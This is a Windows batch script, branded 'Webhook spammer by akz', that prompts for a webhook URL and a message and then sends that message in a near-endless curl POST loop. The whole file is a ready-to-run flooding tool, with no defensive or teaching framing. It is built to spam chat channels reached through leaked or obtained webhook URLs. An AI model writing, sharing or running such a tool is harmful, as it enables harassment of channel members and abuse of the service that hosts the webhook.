@echo off
title WEBHOOK SPAMMER BY AKZ/LOUDVOICES
setlocal enabledelayedexpansion
color 0A
:start
cls
echo ----------Webhook spammer by akz-----------------
echo                                                
echo             ;::::;                           
echo           ;::::; :;                          
echo         ;:::::'   :;                         
echo        ;:::::;     ;.                        
echo       ,:::::'       ;           OOO\         
echo       ::::::;       ;          OOOOO\        
echo       ;:::::;       ;         OOOOOOOO       
echo     ,;::::::;     ;'         / OOOOOOO      
echo    ;:::::::::`. ,,,;.        /  / DOOOOOO    
echo  .';:::::::::::::::::;,     /  /     DOOOO   
echo ,::::::;::::::;;;;::::;,   /  /        DOOO  
echo ;`::::::`'::::::;;;::::: ,#/  /          DOOO 
echo :`:::::::`;::::::;;::: ;::#  /            DOOO
echo ::`:::::::`;:::::::: ;::::# /              DOO
echo `:`:::::::`;:::::: ;::::::#/               DOO
echo :::`:::::::`;; ;:::::::::##                OO
echo ::::`:::::::`;::::::::;:::#                OO
echo `:::::`::::::::::::;'`:;::#                O 
echo  `:::::`::::::::;' /  / `:#                  
echo   ::::::`:::::;'  /  /   `#              


set /p "WEBHOOK_URL=Paste your Webhook URL here: "
if "%WEBHOOK_URL%"=="" goto start

set /p "MSG=type the message you want to spam: "
if "%MSG%"=="" set "MSG=Test message from Batch script tool!"

echo.
echo SPAMMING RN TWIN...
echo.


for /L %%i in (1,1,3000000000000000) do (
    echo [SPAMMING FOR YOU GNG...]
    curl -s -H "Content-Type: application/json" ^
         -X POST ^
         -d "{\"content\": \"%MSG%\"}" ^
         "%WEBHOOK_URL%"
    echo.
)

echo --------------------------------------------
echo SPAMMING ENDED TWINN.
echo.
set /p "RETRY=Test another webhook? (Y/N): "
if /i "%RETRY%"=="Y" goto start
exit
